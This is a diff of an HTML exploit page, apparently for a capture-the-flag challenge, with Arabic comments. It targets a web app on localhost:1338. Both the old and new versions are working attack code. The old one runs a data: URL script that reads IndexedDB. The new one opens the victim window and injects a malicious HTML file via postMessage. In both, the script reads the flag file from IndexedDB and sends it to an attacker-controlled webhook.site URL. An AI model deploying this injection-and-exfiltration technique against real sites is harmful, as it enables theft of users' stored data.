@@ -1,42 +1,71 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>Opening localhost and injecting malicious file via postMessage...</h1>
     <script>
         const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
-        
-        // كود الاستخراج المعتاد
-        const scriptContent = `
-            (async () => {
-                const r = indexedDB.open('Files'); // No version needed
-                r.onsuccess = () => {
-                    const db = r.result;
-                    // Check if object store exists
-                    if (!db.objectStoreNames.contains('files')) {
-                        fetch('${ATTACKER_SERVER}?error=no_store_in_data_uri');
-                        return;
-                    }
+
+        // هذا هو الكود الخبيث الذي سيتم حقنه في ملف HTML داخل صفحة localhost
+        // إنه يصل الآن إلى نافذة المهاجم (صفحتنا) عبر window.opener لإعادة العلم
+        const malicious_script = `
+            <script>
+                // We are now running inside localhost's context.
+                // Our creator window is 'window.opener'.
+                
+                // We'll define a function in our opener window to receive the flag.
+                window.opener.receiveFlag = function(flag) {
+                    fetch("${ATTACKER_SERVER}?flag=" + encodeURIComponent(flag));
+                };
+
+                // Now, let's steal the flag from IndexedDB.
+                const dbreq = indexedDB.open('Files', 1);
+                dbreq.onsuccess = () => {
+                    const db = dbreq.result;
                     const tx = db.transaction('files', 'readonly');
                     const store = tx.objectStore('files');
                     const req = store.getAll();
-                    req.onsuccess = e => {
-                        const fileObj = e.target.result.find(o => o.file && o.file.type === 'text/plain');
-                        if (fileObj) {
-                            fileObj.file.text().then(flag => fetch('${ATTACKER_SERVER}?flag=' + encodeURIComponent(flag)));
-                        } else {
-                            fetch('${ATTACKER_SERVER}?error=flag_not_found');
+                    req.onsuccess = (e) => {
+                        const flagObject = e.target.result.find(o => o.file.type === 'text/plain');
+                        if (flagObject) {
+                            flagObject.file.text().then(flagText => {
+                                // Send the flag back to the opener window.
+                                window.opener.receiveFlag(flagText);
+                            });
                         }
                     };
-                    req.onerror = () => fetch('${ATTACKER_SERVER}?error=getall_failed');
                 };
-                r.onerror = () => fetch('${ATTACKER_SERVER}?error=dbopen_failed');
-            })();
+            <\/script>
+            <h1>PWNED by postMessage</h1>
         `;
-        
-        // إنشاء رابط بيانات يحتوي على صفحة كاملة تنفذ الكود
-        const dataUrl = 'data:text/html,<script>' + encodeURIComponent(scriptContent) + '<\/script>';
-        
-        // التنقل إليه
-        window.location = dataUrl;
+
+        try {
+            // 1. افتح صفحة localhost في نافذة جديدة.
+            const victimWindow = window.open('http://localhost:1338', 'victim');
+
+            // 2. انتظر قليلاً للتأكد من أن الصفحة قد بدأت بالتحميل
+            // ولديها مستمع للرسائل جاهز.
+            setTimeout(() => {
+                // 3. جهز الحمولة الخبيثة.
+                const messagePayload = {
+                    type: "share",
+                    files: [{
+                        blob: new Blob([malicious_script], { type: "text/html" }),
+                        cached: false,
+                        name: "pwn.html",
+                        isPublic: true
+                    }]
+                };
+
+                // 4. أرسل الرسالة إلى النافذة التي فتحناها للتو.
+                victimWindow.postMessage(messagePayload, "*");
+                
+                fetch(ATTACKER_SERVER + "?log=Message_Sent_To_Victim_Window");
+
+            }, 2000); // انتظر ثانيتين
+
+        } catch (e) {
+            fetch(ATTACKER_SERVER + "?error=" + encodeURIComponent(e.toString()));
+        }
     </script>
 </body>
 </html>
